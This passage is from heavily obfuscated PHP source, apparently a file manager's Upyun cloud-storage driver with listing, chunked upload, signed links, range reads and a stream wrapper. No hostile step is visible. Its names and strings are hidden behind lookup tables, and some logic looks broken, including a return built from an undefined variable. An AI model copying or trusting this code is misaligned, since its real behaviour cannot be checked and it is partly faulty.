$ƒ Ù¸Ò»; } $ƒ Ù¸Ò»[$¢±¤†Á[215]] = $ƒ Ù¸Ò»[$¢±¤†Á[85]] = 0; $ƒ Ù¸Ò»[$¢±¤†Á[216]] = $ƒ Ù¸Ò»[$¢±¤†Á[217]] = !0; if (empty($Áº…²ç)) { $Áº…²ç = $this->objectMeta($¢µÆË); if (!$Áº…²ç) { return $ƒ Ù¸Ò»; } } $ƒ Ù¸Ò»[$¢±¤†Á[215]] = intval($Áº…²ç[$¢±¤†Á[1492]]); $ƒ Ù¸Ò»[$¢±¤†Á[85]] = intval($Áº…²ç[$¢±¤†Á[1493]]); $ƒ Ù¸Ò»[$¢±¤†Á[76]] = $Áº…²ç[$¢±¤†Á[76]]; return $ƒ Ù¸Ò»; } public function folderInfo($Õ‡µ¢éù, $‰‚‡˜ › = false) { $ Ú«ì½Ë =& $_SERVER[³½¬ÚË¯]; $œªÎƒ¿§ = array($ Ú«ì½Ë[32] => $this->pathThis($Õ‡µ¢éù), $ Ú«ì½Ë[84] => $this->getPathOuter($ Ú«ì½Ë[8] . $Õ‡µ¢éù), $ Ú«ì½Ë[33] => $ Ú«ì½Ë[75]); if ($‰‚‡˜ ›) { return $œªÎƒ¿§; } $œªÎƒ¿§[$ Ú«ì½Ë[215]] = $œªÎƒ¿§[$ Ú«ì½Ë[85]] = 0; $œªÎƒ¿§[$ Ú«ì½Ë[216]] = $œªÎƒ¿§[$ Ú«ì½Ë[217]] = !0; if (empty($òÔŒüè•)) { $òÔŒüè• = $this->objectMeta($Õ‡µ¢éù); if (!$òÔŒüè•) { return $œªÎƒ¿§; } } $œªÎƒ¿§[$ Ú«ì½Ë[215]] = intval($òÔŒüè•[$ Ú«ì½Ë[1492]]); $œªÎƒ¿§[$ Ú«ì½Ë[85]] = intval($òÔŒüè•[$ Ú«ì½Ë[1493]]); return $œªÎƒ¿§; } private function listObjs($«ŸÇìªº, $—ä¸³¼— = 0, $îéö ê± = 1000) { $‡À¨¢¨ =& $_SERVER[³½¬ÚË¯]; $ÉñÖÜºî = array($‡À¨¢¨[1494], $‡À¨¢¨[1495] . $îéö ê±); if ($—ä¸³¼—) { $ÉñÖÜºî[] = $‡À¨¢¨[1496] . $—ä¸³¼—; } $¬Ö¸ó¬¾ = $this->ussRequest($«ŸÇìªº, $‡À¨¢¨[245], !1, $ÉñÖÜºî); return !$¬Ö¸ó¬¾[$‡À¨¢¨[1255]] ? !1 : $¬Ö¸ó¬¾[$‡À¨¢¨[1245]]; } private function fileList($¿ÉÃé£¼, &$ƒÄÎ Ø›, &$½»öÜ¤ï, $µÃ£†·ü = false) { $ãè–«æ¤ =& $_SERVER[³½¬ÚË¯]; $°ãŸÄù = $ãè–«æ¤[12]; $ÌÔ÷ß¨â = 1000; $¯Œîóî = rtrim($¿ÉÃé£¼, $ãè–«æ¤[8]) . $ãè–«æ¤[8]; while (!0) { check_abort(); $û²ªåâÑ = $this->listObjs($¿ÉÃé£¼, $°ãŸÄù, $ÌÔ÷ß¨â); if (!$û²ªåâÑ) { return !1; } $°ãŸÄù = isset($û²ªåâÑ[$ãè–«æ¤[1497]]) ? $û²ªåâÑ[$ãè–«æ¤[1497]] : $ãè–«æ¤[12]; $±€áª = isset($û²ªåâÑ[$ãè–«æ¤[1498]]) ? $û²ªåâÑ[$ãè–«æ¤[1498]] : array(); foreach ($±€áª as $ø‡ÃúĞ÷) { $ßÙº”” = $ø‡ÃúĞ÷[$ãè–«æ¤[33]] == $ãè–«æ¤[75] ? !0 : !1; $‹ğùçƒ = ltrim($¯Œîóî . $ø‡ÃúĞ÷[$ãè–«æ¤[32]], $ãè–«æ¤[8]) . ($ßÙº”” ? $ãè–«æ¤[8] : $ãè–«æ¤[12]); $‘ù÷æôÑ = array($ãè–«æ¤[32] => $‹ğùçƒ, $ãè–«æ¤[33] => $ßÙº”” ? $ãè–«æ¤[75] : $ãè–«æ¤[214], $ãè–«æ¤[76] => $ø‡ÃúĞ÷[$ãè–«æ¤[381]], $ãè–«æ¤[1493] => $ø‡ÃúĞ÷[$ãè–«æ¤[1499]]); $this->cacheMethodInfoSet($‹ğùçƒ, $ßÙº””, $‘ù÷æôÑ); if ($ßÙº””) { $ƒÄÎ Ø›[] = $‹ğùçƒ; if ($µÃ£†·ü) { $this->fileList($‹ğùçƒ, $ƒÄÎ Ø›, $½»öÜ¤ï, $µÃ£†·ü); } continue; } $½»öÜ¤ï[] = $‘ù÷æôÑ; } if (count($±€áª) < $ÌÔ÷ß¨â) { break; } } $this->cacheMethodInfoSet($¿ÉÃé£¼, !0); } public function listPath($§°äìÆâ, $ø«Õ˜ƒ± = false) { $¥ô¾Ñ× =& $_SERVER[³½¬ÚË¯]; $Ì¤¾Óù = $«Ìßåˆï = array(); $this->fileList($§°äìÆâ, $Ì¤¾Óù, $«Ìßåˆï); foreach ($Ì¤¾Óù as $³ßöËŠÄ => $Ö¶£„ÇÁ) { $Ì¤¾Óù[$³ßöËŠÄ] = $this->folderInfo($Ö¶£„ÇÁ, $ø«Õ˜ƒ±); } foreach ($«Ìßåˆï as $³ßöËŠÄ => $Ö¶£„ÇÁ) { $«Ìßåˆï[$³ßöËŠÄ] = $this->fileInfo($Ö¶£„ÇÁ[$¥ô¾Ñ×[32]], $ø«Õ˜ƒ±, $Ö¶£„ÇÁ); } return array($¥ô¾Ñ×[82] => $Ì¤¾Óù, $¥ô¾Ñ×[83] => $«Ìßåˆï); } public function has($°Ïı­ÙÒ, $òÏÏ»ç§ = false, $„Ş£ùşş = true) { $ïÅ¸Œä =& $_SERVER[³½¬ÚË¯]; $½³¡ï  = $ïÅ¸Œä[12]; $Ë²ÕøÁ = 500; $¡üáğ¬÷ = 0; $¡Œ…ƒÊÂ = 0; $÷Ô…¬ˆÕ = rtrim($°Ïı­ÙÒ, $ïÅ¸Œä[8]) . $ïÅ¸Œä[8]; while (!0) { check_abort(); $ú¹¶‡¥± = $this->listObjs($°Ïı­ÙÒ, $½³¡ï , $Ë²ÕøÁ); if (!$ú¹¶‡¥±) { return !1; } $½³¡ï  = isset($ú¹¶‡¥±[$ïÅ¸Œä[1497]]) ? $ú¹¶‡¥±[$ïÅ¸Œä[1497]] : $ïÅ¸Œä[12]; $œÅş»Çâ = isset($ú¹¶‡¥±[$ïÅ¸Œä[1498]]) ? $ú¹¶‡¥±[$ïÅ¸Œä[1498]] : array(); if (empty($œÅş»Çâ)) { break; } $ÆåƒëÚ = array_filter($œÅş»Çâ, function ($µü€’æü) { $ÉàÖÅÚç =& $_SERVER[³½¬ÚË¯]; return $µü€’æü[$ÉàÖÅÚç[33]] == $ÉàÖÅÚç[75]; }); $©—Ş„ = count($œÅş»Çâ); $ÆåƒëÚ = count($ÆåƒëÚ); $âì÷èÅ– = $©—Ş„ - $ÆåƒëÚ; if ($òÏÏ»ç§) { $¡Œ…ƒÊÂ += $ÆåƒëÚ; $¡üáğ¬÷ += $âì÷èÅ–; if ($©—Ş„ < $Ë²ÕøÁ) { break; } continue; } if ($„Ş£ùşş) { if ($âì÷èÅ–) { return !0; } } else { if ($ÆåƒëÚ) { return !0; } } if ($©—Ş„ < $Ë²ÕøÁ) { break; } } if ($òÏÏ»ç§) { return array($ïÅ¸Œä[223] => $¡üáğ¬÷, $ïÅ¸Œä[224] => $¡Œ…ƒÊÂ); } return !1; } public function listAll($Ø¶Ø×ª–) { $Î¢®Ñä =& $_SERVER[³½¬ÚË¯]; $öı‰§²Å = $¢ëˆÄŸÚ = array(); $this->fileList($Ø¶Ø×ª–, $öı‰§²Å, $¢ëˆÄŸÚ, !0); $Ö°®Ÿ¸ë = array_to_keyvalue($¢ëˆÄŸÚ, $Î¢®Ñä[32]); foreach ($öı‰§²Å as $²³Ôõé†) { if (is_string($²³Ôõé†)) { $Ö°®Ÿ¸ë[$²³Ôõé†] = array($Î¢®Ñä[76] => 0); } } return $this->listAllFiles($Ø¶Ø×ª–, $Ö°®Ÿ¸ë); } public function canRead($»Ø²’îÈ) { return $this->exist($»Ø²’îÈ) ? !0 : !1; } public function canWrite($ÛÑÑòˆ) { return $this->exist($ÛÑÑòˆ) ? !0 : !1; } public function getContent($““Å½£ô) { return $this->fileSubstr($““Å½£ô, 0, -1); } public function setContent($¹íŞÔó±, $éÏƒÕ»ƒ = '') { $ØŞÜéˆ€ =& $_SERVER[³½¬ÚË¯]; if (!$éÏƒÕ»ƒ) { $¡ü¶ÛÑñ = $this->ussRequest($¹íŞÔó±, $ØŞÜéˆ€[241]); return $¡ü¶ÛÑñ[$ØŞÜéˆ€[1255]]; } $¸äõ¿å = $this->tempFile($this->pathThis($¹íŞÔó±)); file_put_contents($¸äõ¿å, $éÏƒÕ»ƒ); if ($this->upload($¹íŞÔó±, $¸äõ¿å)) { $this->tempFileRemve($¸äõ¿å); return !0; } return !1; } public function fileSubstr($—ÓÊğĞ, $ï–ŸÍÇ®, $ß‚¥¶Ø) { $ãœÎÌ¢ò =& $_SERVER[³½¬ÚË¯]; if (!($›ò¨¹ô = $this->link($—ÓÊğĞ))) { return !1; } $¯Œ¸ºƒ = !1; if ($ß‚¥¶Ø > 0) { $Â¤³’Ô… = $ï–ŸÍÇ® + $ß‚¥¶Ø - 1; $¯Œ¸ºƒ = array($ãœÎÌ¢ò[1460] . $ï–ŸÍÇ® . $ãœÎÌ¢ò[430] . $Â¤³’Ô…); } $è›ÈÈò­ = url_request($›ò¨¹ô, $ãœÎÌ¢ò[245], !1, $¯Œ¸ºƒ); return $è›ÈÈò­[$ãœÎÌ¢ò[786]] ? $è›ÈÈò­[$ãœÎÌ¢ò[1245]] : !1; } public function upload($ãí¤³Ñ«, $™³Ê™ñ£, $¸ŞÓ‡ = false, $±È’Î¨ = REPEAT_REPLACE) { $ïÈ«Üß§ =& $_SERVER[³½¬ÚË¯]; $Ï­™£å = IO::size($™³Ê™ñ£); if ($Ï­™£å <= 1024 * 1024 * 200) { $à¨³Ïô© = array($ïÈ«Üß§[1500] . $™³Ê™ñ£); $£şº³Ğ = $this->ussRequest($ãí¤³Ñ«, $ïÈ«Üß§[243], $à¨³Ïô©); return $£şº³Ğ[$ïÈ«Üß§[1255]] ? $this->getPathOuter($ãí¤³Ñ«) : !1; } $Í éÚàÕ = 1024 * 1024 * 10; $¯‚îÙÆ = array($ïÈ«Üß§[1501], $ïÈ«Üß§[1502] . $Ï­™£å, $ïÈ«Üß§[1503], $ïÈ«Üß§[1504] . $Í éÚàÕ); $£şº³Ğ = $this->ussRequest($ãí¤³Ñ«, $ïÈ«Üß§[243], !1, $¯‚îÙÆ); if (!$£şº³Ğ[$ïÈ«Üß§[1255]]) { return !1; } $·¶©¼ÅÔ = $£şº³Ğ[$ïÈ«Üß§[1245]]; $ğ€ºø§ = 0; $îÛõôÒ = $·¶©¼ÅÔ[$ïÈ«Üß§[1505]]; $¾®ÊÏüÖ = fopen($™³Ê™ñ£, $ïÈ«Üß§[1409]); if (!$¾®ÊÏüÖ) { return !1; } do { $Ù®É¼ = $·¶©¼ÅÔ[$ïÈ«Üß§[1506]]; fseek_64($¾®ÊÏüÖ, $ğ€ºø§); $ª¿€àíÉ = fread($¾®ÊÏüÖ, $Ù®É¼); $Ò‰­¬á÷ = 0; do { $Ò‰­¬á÷++; $·¶©¼ÅÔ = $this->uploadPart($ãí¤³Ñ«, $·¶©¼ÅÔ, $ª¿€àíÉ); } while (!$·¶©¼ÅÔ && $Ò‰­¬á÷ < 3); if (!$·¶©¼ÅÔ) { return !1; } $îÛõôÒ = $·¶©¼ÅÔ[$ïÈ«Üß§[1505]]; $ğ€ºø§ += $Ù®É¼; } while ($îÛõôÒ != -1); fclose($¾®ÊÏüÖ); $¯‚îÙÆ = array($ïÈ«Üß§[1507], $ïÈ«Üß§[1508] . $·¶©¼ÅÔ[$ïÈ«Üß§[1509]], $ïÈ«Üß§[1503]); $£şº³Ğ = $this->ussRequest($ãí¤³Ñ«, $ïÈ«Üß§[243], !1, $¯‚îÙÆ); return $£şº³Ğ[$ïÈ«Üß§[1255]] ? $this->getPathOuter($­™Èşçš) : !1; } private function uploadPart($Ëç–£Å, $Ï£¢âÌ, &$å‹’”·Â) { $ÑŠ€û£ =& $_SERVER[³½¬ÚË¯]; $Ï–´è°Ì = array($ÑŠ€û£[1510], $ÑŠ€û£[1508] . $Ï£¢âÌ[$ÑŠ€û£[1509]], $ÑŠ€û£[1511] . $Ï£¢âÌ[$ÑŠ€û£[1505]], $ÑŠ€û£[143] . $Ï£¢âÌ[$ÑŠ€û£[1506]]); $ï…Õğ¦º = $this->ussRequest($Ëç–£Å, $ÑŠ€û£[243], $å‹’”·Â, $Ï–´è°Ì); return !$ï…Õğ¦º[$ÑŠ€û£[1255]] ? $ï…Õğ¦º[$ÑŠ€û£[1255]] : $ï…Õğ¦º[$ÑŠ€û£[1245]]; } public function uploadFormData($Èº÷Ù†…, $„ÛÜøº´ = 3600) { return $this->uploadPolicy($Èº÷Ù†…, $„ÛÜøº´); } public function multiUploadFormData($Ì¶À¯÷Â, $Èğ·¾…ş = 3600) { $ª¶ÄŠØÏ =& $_SERVER[³½¬ÚË¯]; $ßıÂü = (int) $GLOBALS[$ª¶ÄŠØÏ[7]][$ª¶ÄŠØÏ[76]]; return $this->uploadPolicy($Ì¶À¯÷Â, $Èğ·¾…ş, $ßıÂü); } private function uploadPolicy($Ç›˜ñá, $„üèÓ¡Ë = 3600, $¼í¸şÍÄ = 0) { $º–¢³õ =& $_SERVER[³½¬ÚË¯]; $¼¨‡äÍ› = $º–¢³õ[8] . $this->bucket; $ª©œªİ = gmdate($º–¢³õ[1445]); $°İÚ§æ = array($º–¢³õ[1512] => $this->bucket, $º–¢³õ[1513] => $Ç›˜ñá, $º–¢³õ[1514] => time() + $„üèÓ¡Ë, $º–¢³õ[1515] => $ª©œªİ); if ($¼í¸şÍÄ) { $°İÚ§æ[$º–¢³õ[1426]] = $¼í¸şÍÄ; } $Î–«öç° = base64_encode(json_encode($°İÚ§æ)); $í—âÄ¦Ø = base64_encode(hash_hmac($º–¢³õ[1482], "\120\x4f\x53\x54\46{$¼¨‡äÍ›}\46{$ª©œªİ}\46{$Î–«öç°}", md5("{$this->userpass}"), !0)); $¾ßœş’ç = array($º–¢³õ[276] => $Î–«öç°, $º–¢³õ[1516] => "\x55\x50\x59\x55\116\x20{$this->username}\x3a{$í—âÄ¦Ø}", $º–¢³õ[196] => $this->endpoint . $¼¨‡äÍ›); return $¾ßœş’ç; } public function download($¤öçóÜ¬, $Ö±Áë¾î) { $Ú±İÕÖ¬ = IO::getPathInner(IO::mkfile($Ö±Áë¾î)); if (!($ë«³ÆÊ½ = $this->link($¤öçóÜ¬))) { return !1; } $ŸÚÕ½¥» = 0; $é‘ÇÕ—¿ = 1024 * 200; $¡Ô•ßùš = fopen($Ú±İÕÖ¬, $_SERVER[³½¬ÚË¯][1466]); while (!0) { $¬™÷…áá = $this->fileSubstr($¤öçóÜ¬, $ŸÚÕ½¥», $é‘ÇÕ—¿); if ($¬™÷…áá === !1) { return !1; } fwrite($¡Ô•ßùš, $¬™÷…áá); $ŸÚÕ½¥» += $é‘ÇÕ—¿; if (strlen($¬™÷…áá) < $é‘ÇÕ—¿) { break; } } fclose($¡Ô•ßùš); return $Ö±Áë¾î; } public function link($î¿Ê¯Öû, $àœĞ¨¨Ï = array()) { $ÙßßĞÎĞ =& $_SERVER[³½¬ÚË¯]; $î¿Ê¯Öû = trim($î¿Ê¯Öû, $ÙßßĞÎĞ[8]); if (!empty($this->token)) { $“¶Ïáú = strtotime(date($ÙßßĞÎĞ[1517])); $Ó¿ô×‡ = substr(md5($this->token . $ÙßßĞÎĞ[328] . $“¶Ïáú . $ÙßßĞÎĞ[1518] . $î¿Ê¯Öû), 12, 8) . $“¶Ïáú; $àœĞ¨¨Ï[] = $ÙßßĞÎĞ[1519] . $Ó¿ô×‡; } $ƒ÷Œ²²ö = !empty($àœĞ¨¨Ï) ? $ÙßßĞÎĞ[73] . implode($ÙßßĞÎĞ[328], $àœĞ¨¨Ï) : $ÙßßĞÎĞ[12]; return $this->getHost() . $ÙßßĞÎĞ[8] . $î¿Ê¯Öû . $ƒ÷Œ²²ö; } public function fileOut($ÃÂÜÉ…â, $„¥êçığ = false, $ğ“ã‚¥™ = false, $©œî©Âí = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ÃÂÜÉ…â, $„¥êçığ, $ğ“ã‚¥™, $©œî©Âí); } if (!$ğ“ã‚¥™) { $ğ“ã‚¥™ = $this->pathThis($ÃÂÜÉ…â); } $Èïü¸†¸ = $„¥êçığ ? array($_SERVER[³½¬ÚË¯][1520] . rawurlencode($ğ“ã‚¥™)) : array(); $¦ÓÊ‹È· = $this->link($ÃÂÜÉ…â, $Èïü¸†¸); $this->fileOutLink($¦ÓÊ‹È·); } public function fileOutServer($ˆËå¦×, $Ü‚„‡ = false, $í’ÛÎîÊ = false, $€ªÀ¾ÔÓ = '') { parent::fileOut($ˆËå¦×, $Ü‚„‡, $í’ÛÎîÊ, $€ªÀ¾ÔÓ); } public function fileOutImage($ÜÈşôŞ©, $¬†í¨×œ = 250) { $ÎŞå¿Û£ = $this->link($ÜÈşôŞ© . $_SERVER[³½¬ÚË¯][1521] . $¬†í¨×œ); $this->fileOutLink($ÎŞå¿Û£); } public function fileOutImageServer($ã¥‰Îä, $ªĞ“Ôñ = 250) { parent::fileOutImage($ã¥‰Îä, $ªĞ“Ôñ); } public function hashMd5($ËçÇäïº) { $©ÍùÅÆş =& $_SERVER[³½¬ÚË¯]; $ÕúÊ€ş… = $this->_objectMeta($ËçÇäïº); return isset($ÕúÊ€ş…[$©ÍùÅÆş[228]]) ? $ÕúÊ€ş…[$©ÍùÅÆş[228]] : !1; } public function size($ëØçÔ‰Ç) { $¾Š£Â–œ = $this->objectMeta($ëØçÔ‰Ç); return $¾Š£Â–œ ? $¾Š£Â–œ[$_SERVER[³½¬ÚË¯][76]] : 0; } public function info($Ì­İ„“) { if ($this->isFolder($Ì­İ„“)) { return $this->folderInfo($Ì­İ„“); } else { if ($this->isFile($Ì­İ„“)) { return $this->fileInfo($Ì­İ„“); } } return !1; } public function exist($÷Œ‘µå) { return $this->isFile($÷Œ‘µå) || $this->isFolder($÷Œ‘µå); } public function isFile($œ¢µƒÏá) { return !$this->isFolder($œ¢µƒÏá) && $this->objectMeta($œ¢µƒÏá); } public function isFolder($ñ‰Öâ–) { return $this->cacheMethod($_SERVER[³½¬ÚË¯][166], $ñ‰Öâ–); } protected function objectMeta($Ü“×¨ØÇ) { return $this->cacheMethod($_SERVER[³½¬ÚË¯][168], $Ü“×¨ØÇ); } protected function _objectMeta($Ğ°ºÀÔâ) { $”éàÊŸ =& $_SERVER[³½¬ÚË¯]; if ($Ğ°ºÀÔâ == $”éàÊŸ[12] || $Ğ°ºÀÔâ == $”éàÊŸ[8]) { return array(); } $“Œ€äĞ = $this->ussRequest($Ğ°ºÀÔâ, $”éàÊŸ[1522]); if (!$“Œ€äĞ[$”éàÊŸ[1255]]) { return null; } $¯©Û€û« = isset($“Œ€äĞ[$”éàÊŸ[1245]]) ? $“Œ€äĞ[$”éàÊŸ[1245]] : array(); if (!isset($¯©Û€û«[$”éàÊŸ[1523]])) { return null; } $‘®¡´Êü = array($”éàÊŸ[33] => isset($¯©Û€û«[$”éàÊŸ[1523]]) ? $¯©Û€û«[$”éàÊŸ[1523]] : null, $”éàÊŸ[76] => isset($¯©Û€û«[$”éàÊŸ[1524]]) ? $¯©Û€û«[$”éàÊŸ[1524]] : null, $”éàÊŸ[228] => isset($¯©Û€û«[$”éàÊŸ[1525]]) ? $¯©Û€û«[$”éàÊŸ[1525]] : null, $”éàÊŸ[1492] => isset($¯©Û€û«[$”éàÊŸ[1526]]) ? $¯©Û€û«[$”éàÊŸ[1526]] : null); $‘®¡´Êü[$”éàÊŸ[1493]] = isset($¯©Û€û«[$”éàÊŸ[1527]]) ? strtotime($¯©Û€û«[$”éàÊŸ[1527]]) : $‘®¡´Êü[$”éàÊŸ[1492]]; return $‘®¡´Êü; } protected function _isFolder($ËÇÒ•ü©) { $Ãß£íÓû =& $_SERVER[³½¬ÚË¯]; if ($ËÇÒ•ü© == $Ãß£íÓû[12] || $ËÇÒ•ü© == $Ãß£íÓû[8]) { return !0; } $˜±®¦ÑÛ = $this->_objectMeta($ËÇÒ•ü©); return isset($˜±®¦ÑÛ[$Ãß£íÓû[33]]) && $˜±®¦ÑÛ[$Ãß£íÓû[33]] == $Ãß£íÓû[75] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($³É¿üİÔ = false) { } public function exist($£…«²©Û) { $é×èµ¡Î = $this->info($£…«²©Û); return $é×èµ¡Î[$_SERVER[³½¬ÚË¯][216]]; } public function isFile($ ëàØ«Æ) { $åë˜ÓÖ = $this->info($ ëàØ«Æ); return $åë˜ÓÖ[$_SERVER[³½¬ÚË¯][216]]; } public function isFolder($¡ÕÄÖùË) { return !1; } public function size($¸ê©¸±º) { $ˆÓüâÜË = $this->info($¸ê©¸±º); return $ˆÓüâÜË[$_SERVER[³½¬ÚË¯][76]]; } public function info($´ì±‘„Î) { return $this->infoParse($´ì±‘„Î); } public function infoAuth($ƒê÷ÔŒ) { return $this->infoParse($ƒê÷ÔŒ); } public function infoWithChildren($™¨Á¯) { return $this->infoParse($™¨Á¯); } public function infoFull($¹Àû–§Ü) { return $this->infoParse($¹Àû–§Ü); } private function infoParse($ÏÑ‘º±’) { $Šûù¤ö =& $_SERVER[³½¬ÚË¯]; $ä¹Á¥”¢ = $this->header($ÏÑ‘º±’); if (!$ä¹Á¥”¢ || !$ä¹Á¥”¢[$Šûù¤ö[786]]) { return !1; } $Ë»¦¼âú = _get($ä¹Á¥”¢, $Šûù¤ö[381], 0); $Äƒ“Ä¢’ = array($Šûù¤ö[32] => $ä¹Á¥”¢[$Šûù¤ö[32]], $Šûù¤ö[84] => $ÏÑ‘º±’, $Šûù¤ö[33] => $Šûù¤ö[214], $Šûù¤ö[76] => intval($Ë»¦¼âú), $Šûù¤ö[175] => get_path_ext($ä¹Á¥”¢[$Šûù¤ö[32]]), $Šûù¤ö[1406] => $Ë»¦¼âú > 0 && $ä¹Á¥”¢[$Šûù¤ö[1528]], $Šûù¤ö[1407] => !1); return $Äƒ“Ä¢’; } private function header($ú»¯¥Ó) { $¹ô‡¬İ´ =& $_SERVER[³½¬ÚË¯]; if (isset(self::$_cacheHeader[$ú»¯¥Ó])) { return self::$_cacheHeader[$ú»¯¥Ó]; } $£¢…Ë’È = isset($GLOBALS[$¹ô‡¬İ´[1529]]) ? $GLOBALS[$¹ô‡¬İ´[1529]] : !1; $GLOBALS[$¹ô‡¬İ´[1529]] = !0; self::$_cacheHeader[$ú»¯¥Ó] = url_header($ú»¯¥Ó); $GLOBALS[$¹ô‡¬İ´[1529]] = $£¢…Ë’È; return self::$_cacheHeader[$ú»¯¥Ó]; } public function hashSimple($Éèì“ …, $Š‚‡Íı¿ = false) { $Ì’Éıë =& $_SERVER[³½¬ÚË¯]; $Õ³ƒİÁ  = $this->info($Éèì“ …); if (!$Õ³ƒİÁ  || !$Õ³ƒİÁ [$Ì’Éıë[216]]) { return !1; } $ÈÆğ¶ÌÇ = $Õ³ƒİÁ [$Ì’Éıë[76]]; $¼¨É«§ = 200; $½™ñÉæ = 50; if ($ÈÆğ¶ÌÇ <= $¼¨É«§ * $½™ñÉæ) { return md5($this->fileSubstr($Éèì“ …, 0, $ÈÆğ¶ÌÇ)) . $ÈÆğ¶ÌÇ; } $†’¡µˆ = intval($ÈÆğ¶ÌÇ / $½™ñÉæ); $¨í³ÏÌ = $Ì’Éıë[12]; $‚êÊòñ° = timeFloat(); $íÈôù÷ = 15; for ($À©•ğš = 0; $À©•ğš < $½™ñÉæ; $À©•ğš++) { if (timeFloat() - $‚êÊòñ° > $íÈôù÷) { return !1; } $ıñˆÒî­ = $this->fileSubstr($Éèì“ …, $†’¡µˆ * $À©•ğš, $¼¨É«§); if (!$ıñˆÒî­) { return !1; } $¨í³ÏÌ .= $ıñˆÒî­; } $¨í³ÏÌ .= $this->fileSubstr($Éèì“ …, $ÈÆğ¶ÌÇ - $¼¨É«§, $¼¨É«§); return md5($¨í³ÏÌ) . $ÈÆğ¶ÌÇ; } public function getContent($‚ØÔÁÈ°) { return $this->fileSubstr($‚ØÔÁÈ°); } public function fileSubstr($¨’ş¨×Õ, $ˆÌîôğ = 0, $ß«ËŞ = -1) { $‚Ñ¯â¦ =& $_SERVER[³½¬ÚË¯]; $¢¥Ÿî£ü = $this->info($¨’ş¨×Õ); if (!$¢¥Ÿî£ü || !$¢¥Ÿî£ü[$‚Ñ¯â¦[216]] && $¢¥Ÿî£ü[$‚Ñ¯â¦[76]] > 1024 * 1024 * 10) { return !1; } if ($ß«ËŞ === -1) { $ß«ËŞ = $¢¥Ÿî£ü[$‚Ñ¯â¦[76]]; } if ($ß«ËŞ == 0) { return $‚Ñ¯â¦[12]; } $âšÍŸùê = array($‚Ñ¯â¦[1530] . $ˆÌîôğ . $‚Ñ¯â¦[818] . ($ˆÌîôğ + $ß«ËŞ - 1)); $ƒ—ã É = url_request($¨’ş¨×Õ, $‚Ñ¯â¦[245], !1, $âšÍŸùê, !1, !1, 30); return $ƒ—ã É[$‚Ñ¯â¦[1245]] ? $ƒ—ã É[$‚Ñ¯â¦[1245]] : $‚Ñ¯â¦[12]; } public function download($ğïèíÏ÷, $ ‡ú†ĞË) { Downloader::start($ğïèíÏ÷, $ ‡ú†ĞË); return $ ‡ú†ĞË; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ÇŸø÷®Ø, $ÖÙ“‡Áé = '') { $this->info = $this->info($ÇŸø÷®Ø); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[³½¬ÚË¯][84]]; $this->pathOpen = $ÇŸø÷®Ø; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ÇŸø÷®Ø])) { self::$_chunkBuffer[$ÇŸø÷®Ø] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ÄÑÍı‡Ó) { $ËÕÂã€¬ = $this->fileSubstr($this->pose, $ÄÑÍı‡Ó); $this->pose += strlen($ËÕÂã€¬); return $ËÕÂã€¬; } public function stream_tell() { return $this->pose; } public function stream_seek($”ç×Ôàˆ, $Úƒè®‘) { $ˆàö°ˆ­ =& $_SERVER[³½¬ÚË¯]; if ($Úƒè®‘ == SEEK_SET) { $this->pose = $”ç×Ôàˆ; } else { if ($Úƒè®‘ == SEEK_CUR) { $this->pose += $”ç×Ôàˆ; } else { if ($Úƒè®‘ == SEEK_END) { $this->pose = $this->info[$ˆàö°ˆ­[76]] + intval($”ç×Ôàˆ); } } } if ($”ç×Ôàˆ < 0) { $this->pose = $this->info[$ˆàö°ˆ­[76]] + $”ç×Ôàˆ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[³½¬ÚË¯][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($£»ñøÎÔ, $úÜ°ü™‹) { $õş¥áò =& $_SERVER[³½¬ÚË¯]; $»¾üıú = $this->info($£»ñøÎÔ); return array($õş¥áò[1531] => 0, $õş¥áò[1532] => 0, $õş¥áò[16] => 32768 + 511, $õş¥áò[1533] => 0, $õş¥áò[1534] => 0, $õş¥áò[1535] => 0, $õş¥áò[1536] => 0, $õş¥áò[76] => $»¾üıú[$õş¥áò[76]], $õş¥áò[1537] => $»¾üıú[$õş¥áò[1405]], $õş¥áò[1493] => $»¾üıú[$õş¥áò[85]], $õş¥áò[1492] => $»¾üıú[$õş¥áò[215]], $õş¥áò[1538] => 0, $õş¥áò[1539] => 0); } static $fileInfo = array(); public function info($‚¢ãş¯) { $×Ôğø = $_SERVER[³½¬ÚË¯][1540]; if (isset(self::$fileInfo[$‚¢ãş¯])) { return self::$fileInfo[$‚¢ãş¯]; } if (substr($‚¢ãş¯, 0, strlen($×Ôğø)) != $×Ôğø) { return !1; } self::$fileInfo[$‚¢ãş¯] = IO::info(substr($‚¢ãş¯, strlen($×Ôğø))); return self::$fileInfo[$‚¢ãş¯]; } public static function read($‡¼ÉŒ€‡, $çğ±¾Õ¼, $ˆ•Ã„½å) { if (!isset(self::$_fopenCache[$‡¼ÉŒ€‡])) { $ä÷Ãöñ = new StreamWrapperIO(); $ä÷Ãöñ->stream_open($‡¼ÉŒ€‡); self::$_fopenCache[$‡¼ÉŒ€‡] = $ä÷Ãöñ; } $ä÷Ãöñ = self::$_fopenCache[$‡¼ÉŒ€‡]; return $ä÷Ãöñ->fileSubstr($çğ±¾Õ¼, $ˆ•Ã„½å); } public static function _read($™ÙœÂ¥ö, $¶âû¸ƒ, $şıÁÅ»¬) { $û×èöƒ =& $_SERVER[³½¬ÚË¯]; $ÍŒ£½Œ› = fopen($™ÙœÂ¥ö, $û×èöƒ[1409]); if (!$ÍŒ£½Œ›) { return $û×èöƒ[12]; } $ë¦Ï‰œò = 8192; fseek($ÍŒ£½Œ›, $¶âû¸ƒ, SEEK_SET); $şøÂŠä = $û×èöƒ[12]; $ú·ªÎï´ = 0; while ($ú·ªÎï´ < $şıÁÅ»¬) { $ı†‘É™— = min($ë¦Ï‰œò, $şıÁÅ»¬ - $ú·ªÎï´); $şøÂŠä .= fread($ÍŒ£½Œ›, $ı†‘É™—); $ú·ªÎï´ += $ı†‘É™—; } fclose($ÍŒ£½Œ›); return $şøÂŠä; } public function fileSubstr($İ¬Ûóƒú, 